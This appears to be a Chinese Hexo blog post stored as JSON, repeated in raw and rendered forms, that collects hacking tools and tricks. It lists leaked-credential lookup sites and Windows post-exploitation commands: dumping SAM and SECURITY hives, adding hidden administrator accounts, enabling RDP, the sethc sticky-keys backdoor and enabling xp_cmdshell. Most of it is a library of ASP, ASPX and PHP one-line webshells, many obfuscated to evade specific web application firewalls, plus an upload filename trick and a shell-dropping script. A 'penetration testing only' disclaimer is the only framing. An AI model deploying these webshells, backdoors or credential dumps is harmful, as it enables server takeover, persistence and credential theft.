突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","source":"_posts/那些Hack神器及奇技淫巧.md","raw":"---\ntitle: 那些Hack神器及奇技淫巧\ndate: 2016-09-11 23:07:28\npermalink: hacktool\ntags: Hack\ncategories: Hack\n\n---\n# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");\n$a($_POST[\"test\"]); ?>\n```\n\n## PHP高强度一句话：\n```\n<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>  \n```\n\n菜刀连接：``/x.php?x=lostwolf``  脚本类型：php  密码：c\n```\n<?php assert($_REQUEST[\"c\"]);?>\n```\n\n## aspx过狗\n```\n<%@ Page Language=\"Jscript\"%><%var name:String=Request.Item[\"cmd\"];Response.Write(eval(name,\"unsafe\"));%>\n```\n\n# 那些神器\n* Sqlmap\n\n","slug":"hacktool","published":1,"updated":"2016-09-25T17:45:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskbi001r3sonr0wdvrzz","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\" target=\"_blank\" rel=\"external\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\" target=\"_blank\" rel=\"external\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\" target=\"_blank\" rel=\"external\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\" target=\"_blank\" rel=\"external\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\" target=\"_blank\" rel=\"external\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\" target=\"_blank\" rel=\"external\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\" target=\"_blank\" rel=\"external\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>\n<h2 id=\"aspx过狗\"><a href=\"#aspx过狗\" class=\"headerlink\" title=\"aspx过狗\"></a>aspx过狗</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>\n<h1 id=\"那些神器\"><a href=\"#那些神器\" class=\"headerlink\" title=\"那些神器\"></a>那些神器</h1><ul>\n<li>Sqlmap</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>\n<h1 id=\"那些网站\"><a href=\"#那些网站\" class=\"headerlink\" title=\"那些网站\"></a>那些网站</h1><h2 id=\"社工库\"><a href=\"#社工库\" class=\"headerlink\" title=\"社工库\"></a>社工库</h2><h3 id=\"国内\"><a href=\"#国内\" class=\"headerlink\" title=\"国内\"></a>国内</h3><p><a href=\"http://www.findmima.com/\">http://www.findmima.com/</a></p>\n<p><a href=\"http://www.wghostk.com/so/\">http://www.wghostk.com/so/</a></p>\n<p><a href=\"http://p.08lt.com\">http://p.08lt.com</a></p>\n<p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h3 id=\"国际\"><a href=\"#国际\" class=\"headerlink\" title=\"国际\"></a>国际</h3><p><a href=\"https://haveibeenpwned.com/\">https://haveibeenpwned.com/</a></p>\n<p><a href=\"https://leakbase.pw/\">https://leakbase.pw/</a></p>\n<h2 id=\"C段\"><a href=\"#C段\" class=\"headerlink\" title=\"C段\"></a>C段</h2><p><a href=\"http://www.144118.com/\">http://www.144118.com/</a></p>\n<h2 id=\"whois查询\"><a href=\"#whois查询\" class=\"headerlink\" title=\"whois查询\"></a>whois查询</h2><p><a href=\"http://whois.domaintools.com/\">http://whois.domaintools.com/</a></p>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><h1 id=\"那些实用命令\"><a href=\"#那些实用命令\" class=\"headerlink\" title=\"那些实用命令\"></a>那些实用命令</h1><h2 id=\"reg导出sam\"><a href=\"#reg导出sam\" class=\"headerlink\" title=\"reg导出sam\"></a>reg导出sam</h2><p>reg save hklm\\sam sam.hive</p>\n<p>reg save hklm\\system system.hive</p>\n<p>reg save hklm\\security security.hive</p>\n<h2 id=\"Windows新建用户\"><a href=\"#Windows新建用户\" class=\"headerlink\" title=\"Windows新建用户\"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>\n<p>net localgroup administrators admin$ /add</p>\n<p>net user Guest 1234</p>\n<p>net user Guest /active:yes</p>\n<p>net localgroup administrators Guest /add</p>\n<h2 id=\"打开3389-2003-xp\"><a href=\"#打开3389-2003-xp\" class=\"headerlink\" title=\"打开3389(2003,xp)\"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<h2 id=\"sethc后门\"><a href=\"#sethc后门\" class=\"headerlink\" title=\"sethc后门\"></a>sethc后门</h2><p>Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y</p>\n<h2 id=\"mssql-xpcmdshell报错\"><a href=\"#mssql-xpcmdshell报错\" class=\"headerlink\" title=\"mssql xpcmdshell报错\"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>\n<h1 id=\"那些一句话\"><a href=\"#那些一句话\" class=\"headerlink\" title=\"那些一句话\"></a>那些一句话</h1><h2 id=\"asp一句话木马\"><a href=\"#asp一句话木马\" class=\"headerlink\" title=\"asp一句话木马\"></a>asp一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"php一句话木马\"><a href=\"#php一句话木马\" class=\"headerlink\" title=\"php一句话木马\"></a>php一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"aspx一句话\"><a href=\"#aspx一句话\" class=\"headerlink\" title=\"aspx一句话\"></a>aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"数据库加密一句话-密码a\"><a href=\"#数据库加密一句话-密码a\" class=\"headerlink\" title=\"数据库加密一句话(密码a)\"></a>数据库加密一句话(密码a)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>\n<h2 id=\"网站配置、版权信息专用一句话\"><a href=\"#网站配置、版权信息专用一句话\" class=\"headerlink\" title=\"网站配置、版权信息专用一句话\"></a>网站配置、版权信息专用一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"一句话再过护卫神\"><a href=\"#一句话再过护卫神\" class=\"headerlink\" title=\"一句话再过护卫神\"></a>一句话再过护卫神</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"过拦截一句话木马\"><a href=\"#过拦截一句话木马\" class=\"headerlink\" title=\"过拦截一句话木马\"></a>过拦截一句话木马</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"asp闭合型一句话\"><a href=\"#asp闭合型一句话\" class=\"headerlink\" title=\"asp闭合型一句话\"></a>asp闭合型一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>\n<h2 id=\"能过安全狗的解析格式\"><a href=\"#能过安全狗的解析格式\" class=\"headerlink\" title=\"能过安全狗的解析格式\"></a>能过安全狗的解析格式</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的一句话\"><a href=\"#突破安全狗的一句话\" class=\"headerlink\" title=\"突破安全狗的一句话\"></a>突破安全狗的一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"elong过安全狗的php一句话\"><a href=\"#elong过安全狗的php一句话\" class=\"headerlink\" title=\"elong过安全狗的php一句话\"></a>elong过安全狗的php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"后台常用写入php一句话（密码x）\"><a href=\"#后台常用写入php一句话（密码x）\" class=\"headerlink\" title=\"后台常用写入php一句话（密码x）\"></a>后台常用写入php一句话（密码x）</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;? </div><div class=\"line\"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class=\"line\"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); </div><div class=\"line\"> @fclose($fp); </div><div class=\"line\"> ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"高强度php一句话\"><a href=\"#高强度php一句话\" class=\"headerlink\" title=\"高强度php一句话\"></a>高强度php一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"新型变异PHP一句话-密码b4dboy\"><a href=\"#新型变异PHP一句话-密码b4dboy\" class=\"headerlink\" title=\"新型变异PHP一句话(密码b4dboy)\"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>\n<h2 id=\"突破安全狗的aspx一句话\"><a href=\"#突破安全狗的aspx一句话\" class=\"headerlink\" title=\"突破安全狗的aspx一句话\"></a>突破安全狗的aspx一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class=\"line\">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"突破护卫神，保护盾一句话\"><a href=\"#突破护卫神，保护盾一句话\" class=\"headerlink\" title=\"突破护卫神，保护盾一句话\"></a>突破护卫神，保护盾一句话</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class=\"line\">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"PHP高强度一句话：\"><a href=\"#PHP高强度一句话：\" class=\"headerlink\" title=\"PHP高强度一句话：\"></a>PHP高强度一句话：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>\n<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class=\"highlight 